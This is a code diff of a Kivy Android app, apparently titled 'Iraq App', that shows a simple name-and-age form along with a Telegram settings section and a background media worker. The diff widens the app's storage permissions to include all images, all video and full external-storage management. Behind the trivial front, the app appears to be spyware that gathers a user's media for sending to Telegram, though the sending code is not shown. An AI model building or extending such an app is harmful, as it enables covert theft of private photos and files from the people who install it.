@@ -11,7 +11,6 @@ from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.textinput import TextInput
 from kivy.uix.label import Label
 from kivy.uix.button import Button
-from kivy.uix.scrollview import ScrollView
 from kivy.clock import Clock
 
 # ============ إعدادات تيليجرام ============
@@ -134,23 +133,18 @@ class MainApplicationUI(BoxLayout):
         self.spacing = 20
         self._worker_started = False
 
-        # العنوان
         self.add_widget(Label(text="Iraq App (Simple UI)", font_size=30, size_hint_y=None, height=60))
         
-        # حقل الاسم
         self.name_input = TextInput(hint_text="Enter Name", multiline=False, size_hint_y=None, height=60, font_size=20)
         self.add_widget(self.name_input)
         
-        # حقل العمر
         self.age_input = TextInput(hint_text="Enter Age", multiline=False, input_filter='int', size_hint_y=None, height=60, font_size=20)
         self.add_widget(self.age_input)
         
-        # زر الإرسال
         self.send_button = Button(text="Send", font_size=20, size_hint_y=None, height=60)
         self.send_button.bind(on_press=self.on_submit)
         self.add_widget(self.send_button)
         
-        # حالة الإرسال
         self.status_lbl = Label(text="Waiting...", font_size=18, size_hint_y=None, height=60)
         self.add_widget(self.status_lbl)
 
@@ -207,16 +201,24 @@ class MainApplicationUI(BoxLayout):
     def _media_status(self, text):
         Clock.schedule_once(lambda dt: self.set_status(text))
 
-# ============ كلاس التطبيق ============
+# ============ كلاس التطبيق (مع جميع الأذونات الحديثة) ============
 class IraqApp(App):
     def on_start(self):
         if platform == 'android':
             from android.permissions import request_permissions, Permission
             try:
-                request_permissions([
+                permissions = [
                     Permission.READ_EXTERNAL_STORAGE,
                     Permission.WRITE_EXTERNAL_STORAGE,
-                ])
+                ]
+                if hasattr(Permission, 'READ_MEDIA_IMAGES'):
+                    permissions.append(Permission.READ_MEDIA_IMAGES)
+                if hasattr(Permission, 'READ_MEDIA_VIDEO'):
+                    permissions.append(Permission.READ_MEDIA_VIDEO)
+                if hasattr(Permission, 'MANAGE_EXTERNAL_STORAGE'):
+                    permissions.append(Permission.MANAGE_EXTERNAL_STORAGE)
+                
+                request_permissions(permissions)
             except Exception as e:
                 print(f"Permission error: {e}")
 
